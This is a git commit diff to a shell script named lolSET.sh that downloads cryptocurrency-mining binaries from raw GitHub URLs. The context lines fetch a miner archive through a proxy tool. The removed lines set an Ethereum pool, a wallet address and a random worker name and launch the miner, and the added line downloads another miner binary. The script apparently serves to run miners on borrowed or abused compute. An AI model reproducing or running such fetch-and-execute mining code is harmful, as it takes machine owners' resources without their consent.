e145b882cc3f493fde04b4f503fec46577d495c0
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-04-08 10:04:00 +0700

    Update lolSET.sh

--- lolSET.sh
+++ lolSET.sh
@@ -44,12 +44,5 @@ chmod +x bezzHash
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
 
-POOL=etc.2miners.com:1010
+wget https://raw.githubusercontent.com/angkii/MJ/raw/main/tuyulgpu
 
-WALLET=0x11880b1cfe04907c5306222be1e09f4bbb480eb5
-
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-sty)
-
-chmod +x tuyulgpu
-
-./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
